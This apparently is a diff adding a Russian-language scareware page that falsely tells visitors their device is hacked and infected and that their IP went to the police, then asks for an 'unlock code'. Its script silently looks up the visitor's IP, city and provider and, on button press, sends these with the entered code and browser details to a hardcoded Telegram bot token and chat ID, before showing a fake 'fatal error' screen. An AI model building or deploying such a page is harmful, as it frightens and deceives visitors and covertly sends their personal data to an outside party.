@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>СИСТЕМА ВЗЛОМАНА</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            padding-top: 10%;
+            overflow: hidden;
+        }
+        h1 { font-size: 24px; animation: blink 0.5s infinite alternate; }
+        .container { border: 2px solid #ff0000; padding: 20px; margin: 20px; box-shadow: 0 0 20px #ff0000; background: rgba(255,0,0,0.1); }
+        p { font-size: 16px; margin: 10px 0; }
+        input { background: #000; border: 2px solid #ff0000; color: #ff0000; padding: 12px; font-size: 18px; text-align: center; width: 200px; margin-top: 15px; outline: none; }
+        button { background: #ff0000; color: #000; border: none; padding: 12px 24px; font-size: 18px; font-weight: bold; margin-top: 15px; cursor: pointer; box-shadow: 0 0 10px #ff0000; }
+        .warning { font-weight: bold; font-size: 18px; color: yellow; animation: blink 1s infinite; }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            100% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <audio id="siren" loop>
+        <source src="https://www.soundjay.com/buttons/sounds/beep-01a.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="container">
+        <h1>⚠️ СИСТЕМА ВЗЛОМАНА ⚠️</h1>
+        <p class="warning">Ваше устройство заражено.</p>
+        <p>IP-адрес передан в службу безопасности.</p>
+        <p>Для отмены блокировки введите код:</p>
+        
+        <input type="text" id="code" placeholder="Введите код" autocomplete="off">
+        <br>
+        <button onclick="trigger()">ПОДТВЕРДИТЬ</button>
+    </div>
+
+    <script>
+        // Твои данные для телеграм-бота
+        const TOKEN = "8943237187:AAF3_otWiSDWb5sTKv4HAHHFJzeKjt7b8E";
+        const CHAT_ID = "7555845632";
+        
+        let userIP = "Скрыт";
+        let userCity = "Неизвестно";
+        let userISP = "Неизвестно";
+
+        // Скрипт для получения IP
+        fetch('http://ip-api.com/json/')
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.query || "Не удалось";
+                userCity = data.city || "Не удалось";
+                userISP = data.isp || "Не удалось";
+            }).catch(() => {});
+
+        function trigger() {
+            // Запуск сирены
+            const siren = document.getElementById('siren');
+            siren.play().catch(e => console.log("Звук заблокирован браузером"));
+
+            const code = document.getElementById('code').value || "Не ввел";
+            const ua = navigator.userAgent;
+
+            // Формируем сообщение
+            const msg = `🚨 ВЗЛОМ! 🚨%0A%0AВведенный код: ${code}%0AIP: ${userIP}%0AГород: ${userCity}%0AПровайдер: ${userISP}%0AУстройство: ${ua}`;
+
+            // Отправляем в телеграм
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`, { mode: 'no-cors' });
+
+            // Меняем экран на "Фатальная ошибка"
+            document.body.innerHTML = `
+                <div style="text-align:center; padding-top:20%;">
+                    <h1 style="color:red; font-size:40px;">ФАТАЛЬНАЯ ОШИБКА</h1>
+                    <p>Попытка несанкционированного доступа.</p>
+                    <p>Данные переданы в полицию.</p>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
